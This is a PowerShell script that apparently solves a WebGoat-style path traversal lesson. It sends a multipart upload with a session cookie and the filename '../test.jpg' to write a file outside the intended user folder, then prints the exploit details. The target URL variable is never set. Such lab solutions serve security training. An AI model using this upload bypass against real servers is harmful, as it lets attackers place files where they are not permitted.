# Path Traversal - Request Manipulation Bypass

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Path Traversal - Direct Request Bypass" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Paste JSESSIONID:" -ForegroundColor White
$sessionId = Read-Host

Write-Host ""
Write-Host "Creating test image file..." -ForegroundColor Cyan

$testFile = "C:\Users\mahad\scripts\test.jpg"
$jpegBytes = [byte[]](0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xFF, 0xD9)
[System.IO.File]::WriteAllBytes($testFile, $jpegBytes)

Write-Host "Created test.jpg" -ForegroundColor Green
Write-Host ""
Write-Host "Bypassing by putting path traversal in filename field..." -ForegroundColor Cyan
Write-Host ""

# The fix removed fullName from path construction and now uses the uploaded filename
# But the filename field is not validated!

Write-Host "Testing path traversal in filename parameter..." -ForegroundColor Yellow

try {
    # Use curl for simpler multipart handling with custom filename
    $response = curl.exe -s -X POST $url `
        -H "Cookie: JSESSIONID=$sessionId" `
        -H "X-Requested-With: XMLHttpRequest" `
        -F "uploadedFileRemoveUserInput=@$testFile;filename=../test.jpg" `
        -F "fullName=test" `
        -F "email=test@test.com" `
        -F "password=test" 2>$null | ConvertFrom-Json
    
    if ($response.lessonCompleted -eq $true) {
        Write-Host ""
        Write-Host "SUCCESS!" -ForegroundColor Green
        Write-Host ""
        Write-Host "Lesson completed!" -ForegroundColor Green
        Write-Host "Feedback: $($response.feedback)" -ForegroundColor White
        Write-Host ""
        Write-Host "Exploit details:" -ForegroundColor Cyan
        Write-Host "  - Vulnerability: Unvalidated filename in multipart upload" -ForegroundColor White
        Write-Host "  - Payload: filename=../test.jpg" -ForegroundColor White
        Write-Host "  - Method: Direct HTTP request with path traversal in filename" -ForegroundColor White
        Write-Host "  - Result: File uploaded to PathTraversal root instead of PathTraversal/nooniman" -ForegroundColor White
        
        Remove-Item $testFile -Force -ErrorAction SilentlyContinue
        exit 0
    } else {
        Write-Host "Failed: $($response.feedback)" -ForegroundColor Red
    }
} catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}

Remove-Item $testFile -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
